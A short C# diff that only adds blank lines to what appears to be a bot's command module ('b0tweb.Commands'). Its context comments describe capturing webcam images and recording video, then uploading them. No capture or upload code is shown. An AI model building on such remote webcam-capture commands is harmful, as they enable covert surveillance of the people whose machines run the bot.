@@ -29,6 +29,7 @@ namespace b0tweb.Commands
 
             return "Invalid arguments for the webcam command specified";
         }
+
         /// <summary>
         /// Captures image from a webcam using EmguCV and uploads it.
         /// </summary>
@@ -50,6 +51,7 @@ namespace b0tweb.Commands
             return url;
 
         }
+
         /// <summary>
         /// Records a video using Emgu through the webcam and uploads it
         /// </summary>
